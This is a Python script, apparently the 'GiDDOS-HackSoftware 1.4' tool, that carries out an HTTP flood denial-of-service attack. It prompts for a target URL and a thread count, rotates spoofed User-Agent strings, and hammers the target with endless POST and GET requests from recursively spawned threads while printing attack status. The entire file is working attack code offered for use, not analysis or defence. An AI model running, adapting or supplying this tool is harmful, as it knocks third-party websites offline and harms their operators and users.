# -*- coding: utf-8 -*-
import requests
import threading
import time
import sys
import os
import random
from colorama import init
from colorama import Fore, Style
from threading import Thread
from sys import stdout
from time import sleep
init()
print(Style.BRIGHT + Fore.GREEN)

user_agent = None
user_agent_one_random = None

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print ( Fore.GREEN + "Product version 1.4 ")
	print ( Fore.YELLOW + Style.BRIGHT + "■□■□■" + Fore.GREEN + Style.BRIGHT +" GiDDOS-HackSoftware 1.4 ║ BY TUSSA " + Fore.YELLOW + Style.BRIGHT + "■□■□■" + Fore.GREEN + Style.BRIGHT)
	print("\n")
	print("   ▄████  ██▓▓█████▄ ▓█████▄  ▒█████    ██████" + Fore.RED + "  V.1.4" + Fore.GREEN)
	print("  ██▒ ▀█▒▓██▒▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒")
	print(" ▒██░▄▄▄░▒██▒░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   ")
	print(" ░▓█  ██▓░██░░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒")
	print(" ░▒▓███▀▒░██░░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒")
	print("  ░▒   ▒ ░▓   ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░")
	print("   ░   ░  ▒ ░ ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░")
	print(" ░ ░   ░  ▒ ░ ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  ")
	print("       ░  ░     ░       ░        ░ ░        ░  ")
	print("              ░       ░                      \n")
	print(Style.BRIGHT)
	a = 0
	url = None
	url_check_status = None
	thrnom = None
	url = input( Style.BRIGHT + "root" + Fore.RED + "@" + Fore.GREEN + "giddos (URL)" + Fore.YELLOW + " ► " + Fore.RED )

	user_agent_for_all = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
			  'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
			  'Mozilla/5.0 (compatible; ABrowse 0.4; Syllable)',
			  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Maxthon; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
			  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
			  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
			  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB6; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
			  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
			  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)',
			  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)',
			  'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.814.0',
			  'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.1 Safari/535.1',
			  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.36 (KHTML, like Gecko) Chrome/13.0.766.0 Safari/534.36',
			  'Mozilla/5.0 (X11; Linux amd64) AppleWebKit/534.36 (KHTML, like Gecko) Chrome/13.0.766.0 Safari/534.36',
			  'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.35 (KHTML, like Gecko) Ubuntu/10.10 Chromium/13.0.764.0 Chrome/13.0.764.0 Safari/534.35',
			  'Mozilla/5.0 (X11; CrOS i686 0.13.507) AppleWebKit/534.35 (KHTML, like Gecko) Chrome/13.0.763.0 Safari/534.35',
			  'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.33 (KHTML, like Gecko) Ubuntu/9.10 Chromium/13.0.752.0 Chrome/13.0.752.0 Safari/534.33',
			  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/534.31 (KHTML, like Gecko) Chrome/13.0.748.0 Safari/534.31',
			  'Mozilla/5.0 (Windows NT 6.1; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.750.0 Safari/534.30',
			  'Mozilla/5.0 (X11; CrOS i686 12.433.109) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30',
			  'Mozilla/5.0 (X11; CrOS i686 12.0.742.91) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30',
			  'Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko)',
			  'Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b1pre) Gecko/20080923171103 Fennec/0.8',
			  'Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a2pre) Gecko/20080820121708 Fennec/0.7',
			  'Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a1pre) Gecko/2008071707 Fennec/0.5',
			  'Mozilla/5.0 (X11; U; Linux; de-DE) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
			  'Mozilla/4.0 (compatible; MSIE 5.01; AOL 4.0; Windows 98)',
			  'Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Windows 98)',
			  'Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Windows 95)',
			  'Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Mac_68K)',
			  'Mozilla/5.0 (X11; Linux i686; U; rv:1.7) Gecko/0 Kazehakase/0.4.3',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20060216 Kazehakase/0.4.2',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070224 Kazehakase/0.3.9',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20050923 Kazehakase/0.3.9',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/0 Kazehakase/0.3.9',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20060717 Kazehakase/0.3.8 Debian/0.3.8-2',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/0 Kazehakase/0.3.8',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/0 Kazehakase/0.3.5',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20051128 Kazehakase/0.3.3 Debian/0.3.3-1',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/0 Kazehakase/0.3.1',
			   ]
	user_agent_one_random = random.choice(user_agent_for_all)

	if url == "exit":
		sys.exit()

	elif url == "EXIT":
		sys.exit()

	try:
		requests.get(url)

	except:
		print( Fore.RED + "[ERROR] URL " + "'" + str(url) + "'" + " not exist!")
		restart_c = 6
		for y in range(int(5)):
			y += 1 
			restart_c -= 1
			print("[INFO] Restart after " + str(restart_c))
			time.sleep(1)
		main()

	print( Style.BRIGHT + Fore.YELLOW +" ► " + Fore.GREEN + "OK" )
	thrnom = input( Style.BRIGHT + "root" + Fore.RED + "@" + Fore.GREEN + "giddos (Threads)" + Fore.YELLOW + " ► " + Fore.RED )

	if thrnom == "0":
		print( Fore.RED + "[ERROR] Threads count is incorrect!")
		restart_c = 6
		for y in range(int(5)):
			y += 1 
			restart_c -= 1
			print("[INFO] Restart after " + str(restart_c))
			time.sleep(1)
		main()

	elif thrnom == "":
		print( Fore.RED + "[ERROR] Threads count is incorrect!")
		restart_c = 6
		for y in range(int(5)):
			y += 1 
			restart_c -= 1
			print("[INFO] Restart after " + str(restart_c))
			time.sleep(1)
		main()

	try:
		int(thrnom)
	except ValueError:
		print( Fore.RED + "[ERROR] Threads count is incorrect!")
		restart_c = 6
		for y in range(int(5)):
			y += 1 
			restart_c -= 1
			print("[INFO] Restart after " + str(restart_c))
			time.sleep(1)
		main()

	print( Style.BRIGHT + Fore.YELLOW +" ► " + Fore.GREEN + "OK" )
	print()
	print( Fore.YELLOW + Style.BRIGHT +"[" + Fore.RED + "1" + Fore.YELLOW + "]" + Style.BRIGHT + Fore.GREEN + " Use one User-Agent always" )
	print( Fore.YELLOW + Style.BRIGHT +"[" + Fore.RED + "2" + Fore.YELLOW + "]" + Style.BRIGHT + Fore.GREEN + " Changing User-Agent for each cycle" )
	print()
	mode_ask = input( Style.BRIGHT + "root" + Fore.RED + "@" + Fore.GREEN + "giddos (Option)" + Fore.YELLOW + " ► " + Fore.RED )

	if mode_ask == "1":
		print( Style.BRIGHT + Fore.YELLOW +" ► " + Fore.GREEN + "OK" )
	elif mode_ask == "2":
		print( Style.BRIGHT + Fore.YELLOW +" ► " + Fore.GREEN + "OK" )

	else:
		print( Style.BRIGHT + Fore.RED + "[ERROR] Invalid answer!")
		restart_c = 6
		for y in range(int(5)):
			y += 1 
			restart_c -= 1
			print("[INFO] Restart after " + str(restart_c))
			time.sleep(1)
		main()

	print()
	print ( Fore.YELLOW + Style.BRIGHT + "[" + Fore.RED + "●" + Fore.YELLOW + "]" + Style.BRIGHT + Fore.GREEN + " YES (y)")
	print ( Fore.YELLOW + Style.BRIGHT + "[" + Fore.RED + "●" + Fore.YELLOW + "]" + Style.BRIGHT + Fore.GREEN + " NO (n)")
	print()
	ask_for_start = input( Style.BRIGHT + "root" + Fore.RED + "@" + Fore.GREEN + "giddos (Start DDoS?)" + Fore.YELLOW + " ► " + Fore.RED )


	def ddos_mode1():
		headers = { "User-Agent": user_agent_one_random }
		while(1<10):
			try:
				spam = requests.post(url=url, headers=headers)
				spam2 = requests.get(url=url, headers=headers)
				for i in range(int(thrnom)):
					thr = Thread(target = ddos_mode1, daemon=True)
					thr.start()
					url_check_status = requests.get(url=url, headers=headers)
					if url_check_status.status_code == 200:
						sys.stdout.write( Style.BRIGHT + Fore.GREEN + "[+] DDoS Attack is running! URL status code: " + str(url_check_status) + "\n")
					else:
						sys.stdout.write( Style.BRIGHT + Fore.RED + "[+] DDoS Attack is running! URL status code: " + str(url_check_status) + "\n")
			except:
				continue

	def ddos_mode2():
		headers = { "User-Agent": random.choice(user_agent_for_all) }
		while(1<10):
			try:
				spam = requests.post(url=url, headers=headers)
				spam2 = requests.get(url=url, headers=headers)
				for i in range(int(thrnom)):
					thr = Thread(target = ddos_mode2, daemon=True)
					thr.start()
					url_check_status = requests.get(url=url, headers=headers)
					if url_check_status.status_code == 200:
						sys.stdout.write( Style.BRIGHT + Fore.GREEN + "[+] DDoS Attack is running! URL status code: " + str(url_check_status) + "\n")
					else:
						sys.stdout.write( Style.BRIGHT + Fore.RED + "[+] DDoS Attack is running! URL status code: " + str(url_check_status) + "\n")
			except:
				continue

	def starter_ddos():
		global user_agent_one_random
		global user_agent_for_all
		if mode_ask == "1":
			ddos_mode1()

		elif mode_ask == "2":
			ddos_mode2()

	if ask_for_start == "NO" or ask_for_start == "N":
		print( Fore.RED + "[INFO] DDoS attack was canceled!" + Fore.RED )
		restart_c = 6
		for y in range(int(5)):
			y += 1 
			restart_c -= 1
			print("[INFO] Restart after " + str(restart_c))
			time.sleep(1)
		main()

	elif ask_for_start == "YES" or ask_for_start == "Y":
		starter_ddos()

	elif ask_for_start == "no" or ask_for_start == "n":
		print( Fore.RED + "[INFO] DDoS attack was canceled!" + Fore.RED )
		restart_c = 6
		for y in range(int(5)):
			y += 1 
			restart_c -= 1
			print("[INFO] Restart after " + str(restart_c))
			time.sleep(1)
		main()

	elif ask_for_start == "yes" or ask_for_start == "y":
		starter_ddos()

	else:
		print( Style.BRIGHT + Fore.RED + "[ERROR] Invalid answer!")
		restart_c = 6
		for y in range(int(5)):
			y += 1 
			restart_c -= 1
			print("[INFO] Restart after " + str(restart_c))
			time.sleep(1)
		main()
main()